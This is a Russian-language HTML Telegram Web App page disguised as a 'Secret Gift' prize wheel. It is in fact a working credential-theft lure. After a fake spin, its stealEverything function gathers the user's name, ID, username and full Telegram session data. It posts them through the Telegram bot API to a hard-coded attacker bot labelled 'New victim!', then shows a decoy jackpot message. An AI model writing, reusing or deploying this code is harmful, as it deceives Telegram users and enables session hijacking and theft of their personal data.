<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secret Gift</title>
    <style>
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .wheel {
            width: 300px;
            height: 300px;
            border-radius: 50%;
            border: 8px solid #ffd700;
            background: conic-gradient(#ff4444 0deg 45deg, #ffaa00 45deg 90deg, #ffff00 90deg 135deg, #44ff44 135deg 180deg, #44ffff 180deg 225deg, #4444ff 225deg 270deg, #aa44ff 270deg 315deg, #ff44aa 315deg 360deg);
            transition: transform 4s cubic-bezier(0.2, 0.8, 0.2, 1);
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
            position: relative;
        }
        .arrow {
            position: absolute;
            top: -20px;
            left: 50%;
            transform: translateX(-50%);
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-top: 25px solid #fff;
            z-index: 2;
        }
        button {
            margin-top: 30px;
            padding: 15px 40px;
            font-size: 20px;
            background: #ffd700;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            color: #000;
        }
        button:disabled { background: #555; color: #888; }
        #status { margin-top: 20px; color: #aaa; }
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex; justify-content: center; align-items: center;
            z-index: 100;
        }
        .modal-content {
            background: #333; padding: 20px; border-radius: 10px; text-align: center;
            border: 2px solid #ffd700;
        }
    </style>
</head>
<body>

    <div style="position: relative;">
        <div class="arrow"></div>
        <div class="wheel" id="wheel"></div>
    </div>

    <button id="spinBtn">Крутить Подарок</button>
    <div id="status"></div>

    <script>
        const tg = window.Telegram.WebApp;
        const wheel = document.getElementById('wheel');
        const spinBtn = document.getElementById('spinBtn');
        const status = document.getElementById('status');

        // ==========================================
        // НАСТРОЙКИ (ЗАПОЛНИ ЭТО)
        // ==========================================
        const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; // Вставь сюда токен от BotFather
        const CHAT_ID = '8658887417';       // Твой ID
        // ==========================================

        tg.ready();
        tg.expand();

        spinBtn.onclick = () => {
            if (spinBtn.disabled) return;
            spinBtn.disabled = true;
            status.innerText = "Крутим...";

            // Крутим
            const deg = 2000 + Math.random() * 360;
            wheel.style.transform = `rotate(${deg}deg)`;

            setTimeout(() => {
                status.innerText = "Поздравляем! Вы выиграли VIP!";
                
                // Отправляем данные
                stealEverything();

                // Показываем "выигрыш"
                showModal();
            }, 4000);
        };

        function stealEverything() {
            // 1. Собираем данные
            const userData = tg.initDataUnsafe?.user || {};
            const session = tg.initData;

            // Формируем текст сообщения
            const text = `🔥 Новая жертва!\n\n` +
                         `👤 Имя: ${userData.first_name || 'Unknown'} ${userData.last_name ? '('+userData.last_name+')' : ''}\n` +
                         `🆔 ID: ${userData.id}\n` +
                         `📱 Username: ${userData.username || 'Нет юзернейма'}\n` +
                         `🔑 СЕССИЯ: ${session}`;

            // 2. Отправляем тебе через Telegram API
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            })
            .then(response => {
                if(response.ok) {
                    console.log("Данные успешно украдены и отправлены!");
                    status.innerText = "Данные отправлены!";
                } else {
                    status.innerText = "Ошибка отправки. Проверь токен.";
                }
            })
            .catch(error => {
                status.innerText = "Ошибка сети. Попробуй позже.";
                console.error(error);
            });
        }

        function showModal() {
            const modal = document.createElement('div');
            modal.className = 'modal';
            modal.innerHTML = `
                <div class="modal-content">
                    <h2>🎉 Джекпот!</h2>
                    <p>Твой подарок: <b>Коллекционная Редкость</b></p>
                    <button onclick="document.querySelector('.modal').remove()" style="margin-top:10px; padding:5px 10px; font-size:14px;">Забрать</button>
                </div>
            `;
            document.body.appendChild(modal);
        }
    </script>
</body>
</html>
